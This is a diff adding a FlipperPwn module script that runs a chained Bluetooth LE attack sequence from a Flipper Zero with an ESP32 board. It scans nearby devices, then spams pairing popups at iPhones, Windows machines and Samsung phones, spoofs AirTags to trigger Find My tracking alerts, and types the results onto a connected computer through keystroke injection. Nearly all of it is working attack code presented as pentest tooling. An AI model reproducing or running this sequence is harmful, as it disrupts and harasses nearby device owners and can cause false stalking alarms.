@@ -1,0 +1,147 @@
+# FlipperPwn Module — Full BLE Chaos Sequence
+# NOVEL: Runs all Bluetooth LE attack vectors in a timed sequence with
+#        logging, instead of running them individually. Useful for assessing
+#        which BLE attacks are effective in a given environment during a
+#        wireless pentest.
+#
+# Attack sequence:
+#   1. BLE device scan (passive recon)
+#   2. iOS popup spam (CVE in iOS 17 BLE proximity dialogs)
+#   3. Windows SwiftPair spam (triggers pairing prompts on nearby Windows machines)
+#   4. Samsung BLE pairing spam (triggers Samsung device prompts)
+#   5. AirTag spoofing (triggers iPhone Find My tracking alerts)
+#   6. Combined btspamall (all types simultaneously)
+#
+# Each phase runs for PHASE_SEC seconds before moving to the next.
+# Results from the BLE scan are typed to the target machine via HID.
+#
+# REQUIREMENTS:
+#   - ESP32 WiFi Dev Board + WiFi Marauder >= 1.6.0 (BLE support)
+#   - AUTHORIZED TESTING ONLY
+
+NAME        ble_chaos
+DESCRIPTION Sequential BLE attack survey: scan + iOS spam + SwiftPair + Samsung + AirTag
+CATEGORY    exploit
+PLATFORMS   WIN,MAC,LINUX
+
+OPTION PHASE_SEC   20    "Duration in seconds for each BLE attack phase"
+OPTION RUN_SCAN    1     "Run passive BLE scan first? (1=yes, 0=skip)"
+OPTION LOG_TARGET  1     "Type results to target machine via HID? (1=yes)"
+
+# ── Phase 0: BLE Scan (passive recon) ────────────────────────────────────────
+WIFI_WAIT 15000
+
+# Open editor for logging if requested
+PLATFORM WIN
+  GUI r
+  DELAY 400
+  STRING notepad
+  ENTER
+  DELAY 800
+  STRINGLN === BLE Environment Assessment ===
+  STRINGLN
+
+PLATFORM MAC
+  GUI SPACE
+  DELAY 400
+  STRING textedit
+  ENTER
+  DELAY 1000
+  STRINGLN === BLE Environment Assessment ===
+  STRINGLN
+
+PLATFORM LINUX
+  CTRL ALT t
+  DELAY 800
+  STRING tee /tmp/ble_assessment.txt
+  ENTER
+  DELAY 300
+  STRINGLN === BLE Environment Assessment ===
+  STRINGLN
+
+# Dump BLE scan results
+WIFI_RESULT
+
+# ── Phase 1: iOS BLE Popup Spam ───────────────────────────────────────────────
+PLATFORM WIN
+  STRINGLN
+  STRINGLN [Phase 1/4] iOS BLE popup spam active ({{PHASE_SEC}}s)...
+  STRINGLN   Target: iPhones/iPads running iOS 17+
+  STRINGLN   Effect: Repeated Bluetooth device pairing dialogs
+
+PLATFORM MAC
+  STRINGLN [Phase 1/4] iOS spam — {{PHASE_SEC}}s
+
+PLATFORM LINUX
+  STRINGLN [Phase 1/4] iOS spam — {{PHASE_SEC}}s
+
+WIFI_WAIT {{PHASE_SEC}}000
+
+# ── Phase 2: Windows SwiftPair Spam ──────────────────────────────────────────
+PLATFORM WIN
+  STRINGLN
+  STRINGLN [Phase 2/4] SwiftPair BLE spam active ({{PHASE_SEC}}s)...
+  STRINGLN   Target: Windows 10/11 machines with Bluetooth enabled
+  STRINGLN   Effect: "New Bluetooth device found" notification popups
+
+PLATFORM MAC
+  STRINGLN [Phase 2/4] SwiftPair — {{PHASE_SEC}}s
+
+PLATFORM LINUX
+  STRINGLN [Phase 2/4] SwiftPair — {{PHASE_SEC}}s
+
+WIFI_WAIT {{PHASE_SEC}}000
+
+# ── Phase 3: Samsung BLE Spam ─────────────────────────────────────────────────
+PLATFORM WIN
+  STRINGLN
+  STRINGLN [Phase 3/4] Samsung BLE spam active ({{PHASE_SEC}}s)...
+  STRINGLN   Target: Samsung Galaxy devices
+  STRINGLN   Effect: Galaxy pairing / accessory connection prompts
+
+PLATFORM MAC
+  STRINGLN [Phase 3/4] Samsung — {{PHASE_SEC}}s
+
+PLATFORM LINUX
+  STRINGLN [Phase 3/4] Samsung — {{PHASE_SEC}}s
+
+WIFI_WAIT {{PHASE_SEC}}000
+
+# ── Phase 4: AirTag Spoof ─────────────────────────────────────────────────────
+PLATFORM WIN
+  STRINGLN
+  STRINGLN [Phase 4/4] AirTag spoof active ({{PHASE_SEC}}s)...
+  STRINGLN   Target: iPhones with Find My Network
+  STRINGLN   Effect: "Unknown AirTag Found Moving With You" alert
+
+PLATFORM MAC
+  STRINGLN [Phase 4/4] AirTag spoof — {{PHASE_SEC}}s
+
+PLATFORM LINUX
+  STRINGLN [Phase 4/4] AirTag spoof — {{PHASE_SEC}}s
+
+WIFI_WAIT {{PHASE_SEC}}000
+
+# ── Summary ───────────────────────────────────────────────────────────────────
+PLATFORM WIN
+  STRINGLN
+  STRINGLN === BLE Assessment Complete ===
+  STRINGLN All four BLE attack phases completed.
+  STRINGLN
+  STRINGLN Findings to document:
+  STRINGLN [ ] iOS devices visible and susceptible to popup spam?
+  STRINGLN [ ] Windows machines received SwiftPair notifications?
+  STRINGLN [ ] Samsung devices in range?
+  STRINGLN [ ] Apple Find My network present?
+  STRINGLN
+  STRINGLN BLE scan log saved to ESP32 SD: /logs/btsniff.log
+
+PLATFORM MAC
+  STRINGLN
+  STRINGLN === BLE Assessment Complete ===
+  STRINGLN Check /logs/btsniff.log on ESP32 SD card.
+
+PLATFORM LINUX
+  STRINGLN
+  STRINGLN === BLE Assessment Complete === Check /logs/btsniff.log
+  CTRL d
